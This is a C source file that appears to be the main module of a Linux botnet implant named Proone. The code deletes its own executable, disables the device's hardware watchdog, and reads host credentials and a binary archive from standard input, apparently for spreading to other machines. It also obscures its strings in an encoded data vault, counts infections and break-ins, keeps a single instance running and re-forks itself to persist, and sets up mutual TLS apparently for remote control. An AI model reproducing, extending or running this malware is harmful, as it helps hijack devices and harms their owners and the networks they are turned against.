#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/wait.h>

#include "proone.h"
#include "protocol.h"
#include "util_rt.h"
#include "dvault.h"
#include "llist.h"
// #include "htbt-worker.h"
#include "mbedtls.h"
#include "proone_conf/x509.h"


struct prne_global prne_g;
struct prne_shared_global *prne_s_g = NULL;

static prne_worker_t resolv_wkr;
static prne_worker_t htbt_wkr;
static prne_worker_t* wkr_arr[2] = { NULL, NULL };
static prne_llist_t wkr_pool;
static void (*proc_fin_call_ptr)(void) = NULL;
static bool finalising = false;
static int int_pipe[2] = { -1, -1 };
static prne_wkr_pollfd_slot_pt int_pfd = NULL;

static void proc_fin_call (void) {
	if (prne_g.caught_signal != 0) {
		prne_llist_entry_t *cur = wkr_pool.head;
		prne_worker_t *w;

		prne_free_wkr_pollfd_slot(int_pfd);
		int_pfd = NULL;

		while (cur != NULL) {
			w = (prne_worker_t*)cur->element;
			if (!w->has_finalised(w->ctx)) {
				w->fin(w->ctx);
			}
			cur = cur->next;
		}

		proc_fin_call_ptr = prne_empty_func;
		finalising = true;
	}
}

static void alloc_workers (prne_wkr_sched_req_t *sched_req) {
	prne_g.resolv = prne_alloc_resolv_worker(&resolv_wkr, sched_req, &prne_g.ssl.rnd);
	if (prne_g.resolv != NULL) {
		resolv_wkr.id = PRNE_RESOLV_WKR_ID;
		wkr_arr[0] = &resolv_wkr;
		if (prne_llist_append(&wkr_pool, &resolv_wkr) == NULL) {
			prne_g.resolv = NULL;
		}
	}
}

static void free_workers (void) {
	for (size_t i = 0; i < sizeof(wkr_arr) / sizeof(prne_worker_t*); i += 1) {
		if (wkr_arr[i] == NULL) {
			continue;
		}
		wkr_arr[i]->free(wkr_arr[i]->ctx);
		wkr_arr[i] = NULL;
	}
	prne_g.resolv = NULL;
}

#ifdef PRNE_DEBUG
static void handle_sigpipe (const int sn) {
	// ALWAYS poll() before writing to fd!
	abort();
}
#endif

static int proone_main (void) {
#ifdef PRNE_DEBUG
	static const struct timespec DBG_BUSY_CHECK_INT = { 1, 0 }; // 1s
#endif
	static int exit_code = 0, poll_ret;
	static prne_wkr_tick_info_t tick_info;
	static prne_wkr_sched_req_t sched_req;
	static prne_llist_entry_t *cur;
	static prne_worker_t *wkr;
#ifdef PRNE_DEBUG
	static struct {
		prne_wkr_sched_req_t sched;
		prne_wkr_timeout_slot_pt busy_tos;
		bool sched_ret;
	} dbg;
#endif

#ifdef PRNE_DEBUG
	signal(SIGPIPE, handle_sigpipe);
#else
	signal(SIGPIPE, SIG_IGN);
#endif

#ifdef PRNE_DEBUG
	prne_init_wkr_sched_req(&dbg.sched);
	dbg.busy_tos = prne_alloc_wkr_timeout_slot(&dbg.sched);
	assert(dbg.busy_tos != NULL);
#endif
	prne_init_wkr_sched_req(&sched_req);
	prne_init_wkr_tick_info(&tick_info);
	prne_init_llist(&wkr_pool);
	alloc_workers(&sched_req);
	if (pipe(int_pipe) == 0) {
		prne_set_pipe_size(int_pipe[0], 1);
		prne_ok_or_die(fcntl(int_pipe[0], F_SETFL, O_NONBLOCK));
		prne_ok_or_die(fcntl(int_pipe[1], F_SETFL, O_NONBLOCK));
		prne_ok_or_die(fcntl(int_pipe[0], F_SETFD, FD_CLOEXEC));
		prne_ok_or_die(fcntl(int_pipe[1], F_SETFD, FD_CLOEXEC));
	}
	int_pfd = prne_alloc_wkr_pollfd_slot(&sched_req);
	if (int_pfd != NULL) {
		int_pfd->pfd.fd = int_pipe[0];
		int_pfd->pfd.events = POLLIN;
	}

	if (wkr_pool.size == 0) {
		exit_code = 1;
		goto END;
	}
	if (prne_g.caught_signal != 0) {
		goto END;
	}

	proc_fin_call_ptr = proc_fin_call;
	prne_wkr_tick_info_set_start(&tick_info);
	while (true) {
		proc_fin_call_ptr();

		cur = wkr_pool.head;
		while (cur != NULL) {
			wkr = (prne_worker_t*)cur->element;

			if (wkr->has_finalised(wkr->ctx)) {
				cur = prne_llist_erase(&wkr_pool, cur);
			}
			else {
				wkr->work(wkr->ctx, &tick_info);
				cur = cur->next;
			}
		}

		if (wkr_pool.size == 0) {
			exit_code = finalising ? 0 : 1;
			break;
		}

		poll_ret = -1;
		if (prne_wkr_sched_req_prep_poll(&sched_req)) {
#ifdef PRNE_DEBUG
			if (!sched_req.timeout_active && sched_req.pfd_arr_size == 0) {
				if (!dbg.busy_tos->active) {
					dbg.busy_tos->active = true;
					dbg.busy_tos->dur = DBG_BUSY_CHECK_INT;
				}
			}
			else {
				dbg.busy_tos->active = false;
			}
			dbg.sched_ret = prne_wkr_sched_req_prep_poll(&dbg.sched);
#endif
			prne_wkr_sched_req_do_poll(&sched_req, &poll_ret);
		}
		else {
#ifdef PRNE_DEBUG
			dbg.busy_tos->active = false;
			dbg.sched_ret = false;
#endif
		}
		prne_wkr_tick_info_set_tick(&tick_info);
		prne_wkr_sched_req_refl_poll(&sched_req, poll_ret, tick_info.tick_diff);
#ifdef PRNE_DEBUG
		if (dbg.sched_ret) {
			prne_wkr_sched_req_refl_poll(&dbg.sched, 0, tick_info.tick_diff);
			if (dbg.busy_tos->active && dbg.busy_tos->reached) {
				const double real_int = prne_real_timespec(DBG_BUSY_CHECK_INT);
				dbg.busy_tos->active = false;
				fprintf(stderr, "* workers have been busy for %.1f second%s straight.\n", real_int, real_int <= 1.0 ? "" : "s");
			}
		}
#endif
	}

END:
	free_workers();

	prne_free_llist(&wkr_pool);
	prne_free_wkr_pollfd_slot(int_pfd);
	prne_free_wkr_tick_info(&tick_info);
	prne_free_wkr_sched_req(&sched_req);
#ifdef PRNE_DEBUG
	prne_free_wkr_timeout_slot(dbg.busy_tos);
	prne_free_wkr_sched_req(&dbg.sched);
#endif

	return exit_code;
}

static bool ensure_single_instance (void) {
	prne_g.lock_shm_fd = shm_open(
		prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL),
		O_RDWR | O_CREAT,
		0666);
	prne_dvault_reset_dict();
	if (prne_g.lock_shm_fd < 0) {
		return true;
	}

	if (flock(prne_g.lock_shm_fd, LOCK_EX | LOCK_NB) < 0) {
		prne_close(prne_g.lock_shm_fd);
		prne_g.lock_shm_fd = -1;

		return false;
	}

	return true;
}

static void delete_myself (const char *arg0) {
#ifndef PRNE_DEBUG
	static const char *proc_path = "/proc/self/exe";
	struct stat st;
	const char *path_to_unlink = NULL;
	char *path_buf = NULL;	  
	
	// get real path of myself
	if (lstat(proc_path, &st) == 0 && (path_buf = (char*)prne_malloc(1, st.st_size + 1)) != NULL && readlink(proc_path, path_buf, st.st_size) == st.st_size) {
		path_buf[st.st_size] = 0;
		path_to_unlink = path_buf;
	}
	else {
		// try to delete arg0 instead
		path_to_unlink = arg0;
	}

	unlink(path_to_unlink);
	prne_free(path_buf);
#endif
}

static void disasble_watchdog (void) {
#ifndef PRNE_DEBUG
	static const char *watchdog_paths[] = {
		"/dev/watchdog",
		"/dev/misc/watchdog"
	};
	static const int one = 1;
	int fd;
	size_t i;

	for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
		if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
			ioctl(fd, 0x80045704, &one);
			prne_close(fd);
			break;
		}
	}
#endif
}

static void handle_interrupt (const int sig) {
	uint8_t rubbish = 0;

	prne_g.caught_signal = sig;
	write(int_pipe[1], &rubbish, 1);
}

static void setup_signal_actions (void) {
	struct sigaction sa;

	sa.sa_handler = handle_interrupt;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_RESETHAND;

	// try to exit gracefully upon reception of these signals
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);
}

static void read_host_credential (void) {
	static const size_t buf_size = (1 + 2 + 255 * 2) * 4 / 3;
	char *buf = (char*)prne_malloc(1, buf_size);
	size_t i;
	bool found = false;

	for (i = 0; i < buf_size; i += 1) {
		if (read(STDIN_FILENO, &buf[i], 1) != 1) {
			goto END;
		}

		if (buf[i] == '\n') {
			found = true;
			break;
		}
	}
	if (found &&
		prne_dec_base64_mem(buf, i, &prne_g.host_cred_data, &prne_g.host_cred_size) &&
		prne_g.host_cred_size > 1 + 2 + 255 * 2) {
		prne_free(prne_g.host_cred_data);
		prne_g.host_cred_data = NULL;
		prne_g.host_cred_size = 0;
	}

END:
	prne_free(buf);
}

static void set_env (void) {
	// environment set up function calls in here
}

static void load_ssl_conf (void) {
	if (mbedtls_x509_crt_parse(&prne_g.ssl.ca, (const uint8_t*)PRNE_X509_CA_CRT, sizeof(PRNE_X509_CA_CRT) - 1) == 0) {
		prne_g.s_ssl.ready =
			mbedtls_ssl_config_defaults(&prne_g.s_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
			mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, (const uint8_t*)PRNE_X509_S_CRT, sizeof(PRNE_X509_S_CRT) - 1) == 0 &&
			mbedtls_pk_parse_key(&prne_g.s_ssl.pk, (const uint8_t*)PRNE_X509_S_KEY, sizeof(PRNE_X509_S_KEY) - 1, NULL, 0) == 0 &&
			mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, (const uint8_t*)PRNE_X509_DH, sizeof(PRNE_X509_DH) - 1) == 0 &&
			mbedtls_ssl_conf_own_cert(&prne_g.s_ssl.conf, &prne_g.s_ssl.crt, &prne_g.s_ssl.pk) == 0 &&
			mbedtls_ssl_conf_dh_param_ctx(&prne_g.s_ssl.conf, &prne_g.s_ssl.dhm) == 0;
		if (prne_g.s_ssl.ready) {
			mbedtls_ssl_conf_ca_chain(&prne_g.s_ssl.conf, &prne_g.ssl.ca, NULL);
			// mutual auth
			mbedtls_ssl_conf_authmode(&prne_g.s_ssl.conf, MBEDTLS_SSL_VERIFY_REQUIRED);
			// ignore expired cert (system wall clock might not be set)
			mbedtls_ssl_conf_verify(&prne_g.s_ssl.conf, prne_mbedtls_x509_crt_verify_cb, NULL); 
		}

		prne_g.c_ssl.ready =
			mbedtls_ssl_config_defaults(&prne_g.c_ssl.conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
			mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, (const uint8_t*)PRNE_X509_C_CRT, sizeof(PRNE_X509_C_CRT) - 1) == 0 &&
			mbedtls_pk_parse_key(&prne_g.c_ssl.pk, (const uint8_t*)PRNE_X509_C_KEY, sizeof(PRNE_X509_C_KEY) - 1, NULL, 0) == 0 &&
			mbedtls_ssl_conf_own_cert(&prne_g.c_ssl.conf, &prne_g.c_ssl.crt, &prne_g.c_ssl.pk) == 0;
		if (prne_g.c_ssl.ready) {
			mbedtls_ssl_conf_ca_chain(&prne_g.c_ssl.conf, &prne_g.ssl.ca, NULL);
			// mutual auth
			mbedtls_ssl_conf_authmode(&prne_g.c_ssl.conf, MBEDTLS_SSL_VERIFY_REQUIRED);
			// ignore expired cert (system wall clock might not be set)
			mbedtls_ssl_conf_verify(&prne_g.c_ssl.conf, prne_mbedtls_x509_crt_verify_cb, NULL); 
		}
	}
}

static void seed_ssl_rnd (const uint8_t *seed, const size_t slen) {
	if (mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, seed, slen) != 0) {
		mbedtls_ctr_drbg_seed(&prne_g.ssl.rnd, mbedtls_entropy_func, &prne_g.ssl.entpy, NULL, 0);
	}
}

static void init_shared_global (void) {
	// just die on error
	const size_t str_len = 1 + 30;
	int fd;
	char *name;

	name = prne_malloc(1, str_len + 1);
	name[0] = '/';
	name[str_len] = 0;
	prne_rnd_anum_str(&prne_g.ssl.rnd, name + 1, str_len - 1);
	
	fd = shm_open(name, O_RDWR | O_CREAT | O_TRUNC, 0000);
	if (fd < 0) {
		abort();
	}
	shm_unlink(name);
	prne_free(name);

	if (ftruncate(fd, sizeof(struct prne_shared_global)) < 0) {
		abort();
	}
	prne_s_g = (struct prne_shared_global*)mmap(NULL, sizeof(struct prne_shared_global), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (prne_s_g == NULL) {
		abort();
	}
	prne_close(fd);

	prne_s_g->bne_cnt = 0;
	prne_s_g->infect_cnt = 0;
}


int main (const int argc, char **args) {
	static int exit_code = 0;
	static int exit_pipe[2] = { -1, -1 };

	prne_g.host_cred_data = NULL;
	prne_g.host_cred_size = 0;
	prne_ok_or_die(clock_gettime(CLOCK_MONOTONIC, &prne_g.god_start));
	prne_g.run_cnt = 0;
	prne_g.resolv = NULL;
	prne_g.god_exit_evt = -1;
	prne_g.caught_signal = 0;
	prne_g.god_pid = getpid();
	prne_g.proone_pid = 0;
	prne_g.lock_shm_fd = -1;
	prne_g.bin_ready = false;
	prne_g.is_child = false;
	prne_init_unpack_bin_archive_result(&prne_g.bin_pack);
	prne_init_bin_archive(&prne_g.bin_archive);
	mbedtls_x509_crt_init(&prne_g.ssl.ca);
	mbedtls_entropy_init(&prne_g.ssl.entpy);
	mbedtls_ctr_drbg_init(&prne_g.ssl.rnd);
	mbedtls_ssl_config_init(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
	mbedtls_pk_init(&prne_g.s_ssl.pk);
	mbedtls_dhm_init(&prne_g.s_ssl.dhm);
	prne_g.s_ssl.ready = false;
	mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
	mbedtls_pk_init(&prne_g.c_ssl.pk);
	prne_g.c_ssl.ready = false;

	// inits that need no outside resources
	prne_init_dvault();
	set_env();
	if (pipe(exit_pipe) == 0) {
		prne_set_pipe_size(exit_pipe[0], 1);
		prne_ok_or_die(fcntl(exit_pipe[0], F_SETFL, O_NONBLOCK));
		prne_ok_or_die(fcntl(exit_pipe[1], F_SETFL, O_NONBLOCK));
		prne_ok_or_die(fcntl(exit_pipe[0], F_SETFD, FD_CLOEXEC));
		prne_ok_or_die(fcntl(exit_pipe[1], F_SETFD, FD_CLOEXEC));
		prne_g.god_exit_evt = exit_pipe[0];
	}

	/* inits that need outside resources. IN THIS ORDER! */
	load_ssl_conf();
	seed_ssl_rnd(NULL, 0);
	init_shared_global();
	delete_myself(args[0]);
	disasble_watchdog();

	read_host_credential();
	// get fed with the bin archive
	prne_g.bin_pack = prne_unpack_bin_archive(STDIN_FILENO);
	if (prne_g.bin_pack.result == PRNE_UNPACK_BIN_ARCHIVE_OK) {
		prne_g.bin_ready = prne_index_bin_archive(&prne_g.bin_pack, &prne_g.bin_archive) == PRNE_INDEX_BIN_ARCHIVE_OK;
	}

	if (!ensure_single_instance()) {
		exit_code = 1;
		goto END;
	}

	// done with the terminal
	prne_close(STDIN_FILENO);
	prne_close(STDOUT_FILENO);
#ifndef PRNE_DEBUG
	prne_close(STDERR_FILENO);
#endif

	setup_signal_actions();

	// main loop
	while (prne_g.caught_signal == 0) {
		prne_g.proone_pid = fork();

		if (prne_g.proone_pid >= 0) {
			prne_g.run_cnt += 1;
		}

		if (prne_g.proone_pid > 0) {
			static int status;

			while (prne_g.caught_signal == 0) {
				if (waitpid(prne_g.proone_pid, &status, 0) < 0) {
					if (errno != EINTR) {
						abort();
					}
					else {
						continue;
					}
				}
				break;
			}

			if (WIFEXITED(status)) {
				if (WEXITSTATUS(status) == 0) {
					break;
				}
#ifdef PRNE_DEBUG
				fprintf(stderr, "* child process %d exited with code %d!\n", prne_g.proone_pid, WEXITSTATUS(status));
#endif
			}
			else if (WIFSIGNALED(status)) {
#ifdef PRNE_DEBUG
				fprintf(stderr, "* child process %d received signal %d!\n", prne_g.proone_pid, WTERMSIG(status));
#endif
			}

			sleep(1);
		}
		else {
			prne_close(prne_g.lock_shm_fd);
			prne_g.lock_shm_fd = -1;
			prne_g.is_child = true;
			seed_ssl_rnd((const uint8_t*)PRNE_BUILD_ENTROPY, sizeof(PRNE_BUILD_ENTROPY));
		
			exit_code = proone_main();
			break;
		}
	}
	prne_g.proone_pid = 0;

END:
	prne_free_bin_archive(&prne_g.bin_archive);
	prne_free_unpack_bin_archive_result(&prne_g.bin_pack);
	prne_g.bin_ready = false;
	
	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
	mbedtls_pk_free(&prne_g.s_ssl.pk);
	mbedtls_dhm_free(&prne_g.s_ssl.dhm);
	prne_g.s_ssl.ready = false;
	mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
	mbedtls_pk_free(&prne_g.c_ssl.pk);
	prne_g.c_ssl.ready = false;
	mbedtls_x509_crt_free(&prne_g.ssl.ca);
	mbedtls_ctr_drbg_free(&prne_g.ssl.rnd);
	mbedtls_entropy_free(&prne_g.ssl.entpy);

	prne_free(prne_g.host_cred_data);
	prne_g.host_cred_data = NULL;
	prne_g.host_cred_size = 0;

	if (prne_g.lock_shm_fd >= 0) {
		shm_unlink(prne_dvault_unmask_entry_cstr(PRNE_DATA_KEY_PROC_LIM_SHM, NULL));
		prne_dvault_reset_dict();
		prne_close(prne_g.lock_shm_fd);
		prne_g.lock_shm_fd = -1;
	}

	prne_deinit_dvault();

	write(exit_pipe[1], &exit_code, sizeof(int));
	prne_close(exit_pipe[0]);
	prne_close(exit_pipe[1]);

	return exit_code;
}
